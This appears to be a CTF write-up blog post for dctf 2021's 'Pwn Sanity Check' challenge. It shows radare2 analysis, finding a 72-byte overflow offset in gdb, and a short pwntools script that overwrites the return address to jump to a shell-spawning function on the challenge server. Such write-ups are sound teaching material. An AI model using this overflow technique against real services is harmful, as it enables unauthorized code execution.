---
title: Pwn Sanity Check
date: 2020-05-16
excerpt: "'Pwn Sanity Check' was a challenge in the Pwn category of dctf 2021"
classes: wide
categories: dctf2021
tags:
  - dctf2021
  - pwn
  - pwntools
  - gdb
  - radare2
---

![img](/assets/images/ctf/dctf2021-pwnsanitycheck/0.png)

Taking a look at the file we see that it's **ELF 64-bit**

```
ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=ae6fb7020a27e2fdccdb6826a57ccc5bfc0d127a, not stripped
```

Loading it in to **radare 2** and listing the functions we can see that there is a **win** function


![img](/assets/images/ctf/dctf2021-pwnsanitycheck/1.png)

Disassembling that function with `pdf @sym.main`


![img](/assets/images/ctf/dctf2021-pwnsanitycheck/2.png)

There's a lot going on. Looks like when the function is called it's checking for two arguments `0xdeadbeef` and `0x1337c0de` and then it gives us a shell? What if we skip the variable checks completely and jump to `0x004006cf`?


![img](/assets/images/ctf/dctf2021-pwnsanitycheck/3.png)

Loading the binary into **gdb** (using gef support), we can start poking at it and try to find the offset

I was having issues with `pattern create/search` so I did it the old fashioned way: sending lots of 'A's and 'B's until something looked neat

Using **gdb with gef** you can use `pi print('A'*100)` to quickly toss a string of characters together

After sending different lenghts, I found that **72** was when we started seeing the 'B' characters leak in

`pi print('A'*72 + 'B')`


![img](/assets/images/ctf/dctf2021-pwnsanitycheck/4.png)

Things we know:

1. The offset is **72**
2. The address we want to jump to is **0x004006cf**
3. It's an **ELF 64-bit** binary

That's enough to write a script using **Pwntools**. Here's mine

```
from pwn import *

p = remote('dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io', 7480)

offset = b'A' * 72

print(p.recvuntil('joke\n'))
p.sendline(offset + p64(0x004006cf))
p.interactive()
```

The `p64(0x004006cf)` function call packs the address in **Little Endian** format, required to be passed, and `p.interactive()` just catches the shell and allows us to send input.


![img](/assets/images/ctf/dctf2021-pwnsanitycheck/5.png)



